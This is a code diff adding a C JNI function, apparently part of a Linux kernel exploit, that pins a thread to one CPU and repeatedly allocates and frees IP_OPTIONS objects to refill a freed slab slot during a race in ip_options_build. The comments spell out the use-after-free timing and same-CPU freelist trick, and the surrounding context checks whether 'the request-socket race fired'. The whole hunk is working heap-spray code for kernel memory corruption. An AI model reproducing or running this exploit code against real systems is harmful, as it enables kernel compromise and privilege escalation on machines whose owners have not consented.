@@ -780,6 +780,65 @@ Java_com_inj_Native_rstSpin(JNIEnv *env, jclass cls, jint fd, jint ms)
     }
     return done;
 }
+// Same-core slab pressure.
+//
+// SLUB keeps one freelist per cpu, and it is LIFO: an object freed on cpu N is
+// handed back to the very next kmalloc on cpu N. The window between the free
+// of the options object (close on the accept thread) and the last dereference
+// in ip_options_build is a few microseconds wide, so a replacement object must
+// be allocated within that time - and on the *same cpu* as the free, or the
+// per-cpu freelists never meet.
+//
+// This thread pins itself to one cpu and hammers setsockopt(IP_OPTIONS) /
+// getsockopt / close. Every cycle allocates one ip_options_rcu and frees it.
+// Running it pinned to the accept thread's cpu turns the freed slot into the
+// head of the freelist exactly when the racing SYNACK is mid-build.
+JNIEXPORT jlong JNICALL
+Java_com_inj_Native_spraySameCpu(JNIEnv *env, jclass cls, jint cpu, jint ms)
+{
+    struct timespec ts0, ts;
+    long cycles = 0;
+    unsigned char buf[128];
+    socklen_t len;
+    (void)env;
+    (void)cls;
+
+    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
+    if (ncpu <= 0 || cpu < 0 || cpu >= (jint)ncpu) {
+        return -1;
+    }
+    unsigned long mask = 1UL << cpu;
+    if (syscall(__NR_sched_setaffinity, 0, sizeof mask, &mask) < 0) {
+        return -errno;
+    }
+
+    clock_gettime(CLOCK_MONOTONIC, &ts0);
+    for (;;) {
+        int s = socket(AF_INET, SOCK_DGRAM, 0);
+        if (s < 0) {
+            break;
+        }
+        unsigned char opt[40];
+        memset(opt, 0x01, sizeof opt);
+        opt[0] = 7;             /* IPOPT_RR */
+        opt[1] = 39;            /* length */
+        opt[2] = 40;            /* pointer, past the end: no in-place edits */
+        opt[39] = 0x01;         /* NOP */
+        if (setsockopt(s, IPPROTO_IP, IP_OPTIONS, opt, 40) == 0) {
+            len = sizeof buf;
+            getsockopt(s, IPPROTO_IP, IP_OPTIONS, buf, &len);
+        }
+        cycles++;
+        close(s);
+        clock_gettime(CLOCK_MONOTONIC, &ts);
+        long elapsed = (ts.tv_sec - ts0.tv_sec) * 1000000L
+                + (ts.tv_nsec - ts0.tv_nsec) / 1000L;
+        if (elapsed >= (long)ms * 1000L) {
+            break;
+        }
+    }
+    return cycles;
+}
 // Read IP_OPTIONS from a socket and report what came back.
 //
 // If the request-socket race fired, the winning child inherited an
